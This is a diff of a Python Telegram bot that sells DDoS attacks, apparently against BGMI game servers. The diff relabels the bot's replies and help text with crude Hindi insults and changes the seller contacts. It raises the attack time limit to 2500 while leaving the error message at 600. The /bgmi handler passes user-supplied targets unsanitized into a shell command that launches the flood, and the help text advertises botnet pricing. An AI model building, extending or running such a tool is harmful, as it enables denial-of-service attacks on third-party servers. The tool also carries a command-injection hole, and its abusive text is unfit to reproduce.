@@ -279,7 +279,7 @@ def start_attack_reply(message, target, port, time):
     user_info = message.from_user
     username = user_info.username if user_info.username else user_info.first_name
     
-    response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.🔥🔥\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: VIP- User of @venomXcrazy"
+    response = f"{username}, ＭＡＡ   ＣＨＯＤＩ.🔥😈\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: VIP- User of @ᴍᴀʀᴏ ʟᴏᴅᴏ ʟᴇ💔"
     bot.reply_to(message, response)
 
 # Dictionary to store the last time each user ran the /bgmi command
@@ -307,7 +307,7 @@ def handle_bgmi(message):
             target = command[1]
             port = int(command[2])  # Convert port to integer
             time = int(command[3])  # Convert time to integer
-            if time > 600:
+            if time > 2500:
                 response = "Error: Time interval must be less than 600."
             else:
                 record_command_logs(user_id, '/bgmi', target, port, time)
@@ -315,12 +315,13 @@ def handle_bgmi(message):
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                 full_command = f"./bgmi {target} {port} {time} 700"
                 process = subprocess.run(full_command, shell=True)
-                response = f"BGMI Attack Finished. Target: {target} Port: {port} Time: {time}"
+                response = f"ᴄᴏᴍᴘʟᴇᴛᴇ ɢᴀɴᴅ ᴍᴀʀᴀʏ ɢᴀʏ ᴄʜᴇ
+                😂. Target: {target} Port: {port} Time: {time}"
                 bot.reply_to(message, response)  # Notify the user that the attack is finished
         else:
             response = "✅ Usage :- /bgmi <target> <port> <time>"  # Updated command syntax
     else:
-        response = ("🚫 Unauthorized Access! 🚫\n\nOops! It seems like you don't have permission to use the /bgmi command. DM TO BUY ACCESS:- @venomXcrazy")
+        response = ("🚫 Unauthorized Access! 🚫\n\nOops! It seems like you don't have permission to use the /bgmi command. DM TO BUY ACCESS:- @ᴍᴀʀᴏ ʟᴏᴅᴏ ʟᴇ")
 
     bot.reply_to(message, response)
 
@@ -348,17 +349,19 @@ def show_command_logs(message):
 @bot.message_handler(commands=['help'])
 def show_help(message):
     help_text ='''🤖 Available commands:
-💥 /bgmi : Method For Bgmi Servers. 
-💥 /rules : Please Check Before Use !!.
-💥 /mylogs : To Check Your Recents Attacks.
-💥 /plan : Checkout Our Botnet Rates.
+💥 /bgmi : 𝐒𝐞𝐫𝐯𝐞𝐫 𝐤𝐢 𝐦𝐚𝐚 𝐜𝐡𝐨𝐝𝐨. 
+💥 /rules : 𝐑𝐮𝐥𝐞𝐬 𝐣𝐚𝐧𝐤𝐞 𝐥𝐨𝐝𝐚 𝐡𝐢𝐥𝐚𝐨𝐠𝐞 𝐤𝐲𝐚𝐚 !!.
+💥 /mylogs : 𝐋𝐚𝐬𝐭 𝐦𝐞 𝐣𝐢𝐭𝐧𝐢 𝐠𝐚𝐧𝐝 𝐦𝐚𝐫𝐢 𝐡𝐞 𝐰𝐨𝐡𝐡
+.
+💥 /plan : 𝗧𝘂 𝘁𝗼 𝗕𝗛𝗜𝗞𝗛𝗔𝗥𝗜 𝗵𝗮𝗶 𝗿𝗲 𝗹𝗼𝗱𝗲
+.
 💥 /myinfo : TO Check Your WHOLE INFO.
 
 🤖 To See Admin Commands:
 💥 /admincmd : Shows All Admin Commands.
 
-Buy From :- @venomXcrazy
-Official Channel :- https://t.me/V3NOM_CH3AT
+Buy From :- @landlelemera
+Official Channel :- @msd
 '''
     for handler in bot.message_handlers:
         if hasattr(handler, 'commands'):
@@ -375,7 +378,7 @@ def welcome_start(message):
     user_name = message.from_user.first_name
     response = f'''❄️ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ ᴘʀᴇᴍɪᴜᴍ ᴅᴅᴏs ʙᴏᴛ, {user_name}! ᴛʜɪs ɪs ʜɪɢʜ ǫᴜᴀʟɪᴛʏ sᴇʀᴠᴇʀ ʙᴀsᴇᴅ ᴅᴅᴏs. ᴛᴏ ɢᴇᴛ ᴀᴄᴄᴇss.
 🤖Try To Run This Command : /help 
-✅BUY :- @venomXcrazy'''
+✅BUY :- @Mihirdave'''
     bot.reply_to(message, response)
 
 @bot.message_handler(commands=['rules'])
@@ -394,7 +397,7 @@ def welcome_plan(message):
     user_name = message.from_user.first_name
     response = f'''{user_name}, Brother Only 1 Plan Is Powerfull Then Any Other Ddos !!:
 
-Vip 🌟 :
+Vip 🌟 : @Mihirdave
 -> Attack Time : 300 (S)
 > After Attack Limit : 10 sec
 -> Concurrents Attack : 5
